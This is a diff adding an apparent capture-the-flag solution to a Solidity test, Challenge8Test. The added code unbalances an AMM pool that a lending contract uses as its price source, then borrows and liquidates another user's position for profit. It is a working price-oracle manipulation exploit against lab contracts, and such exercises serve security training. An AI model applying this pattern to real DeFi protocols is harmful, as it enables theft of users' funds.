@@ -87,7 +87,22 @@ contract Challenge8Test is Test {
         // forge test --match-contract Challenge8Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        token.approve(address(amm), type(uint256).max);
+        dai.approve(address(amm), type(uint256).max);
+        token.approve(address(oiler), type(uint256).max);
 
+        // Step 1. unbalance the pool where the oiler fetches the price
+        amm.swap(address(token), 70);
+        oiler.healthFactor(superman);
+        // Step 2. deposit into the oiler so that we can borrow dTokens to be able to liquidate supermans position
+        oiler.deposit(30);
+        console.log("amount we need to put up for liquidation: ", oiler.getUserData(superman).borrow * 5 / 100);
+        console.log("amount of dTOKEN we can borrow with our deposit: ", oiler.maxBorrow(player) / 10**18);
+        oiler.borrow(5);
+        // Step 3. liquidate superman withdraw our tokens from the contract and get as tokens from the pool
+        oiler.liquidate(superman);
+        oiler.withdraw(oiler.balanceOf(player));
+        amm.swap(address(dai), dai.balanceOf(player));
 
         //==================================================//
         vm.stopPrank();
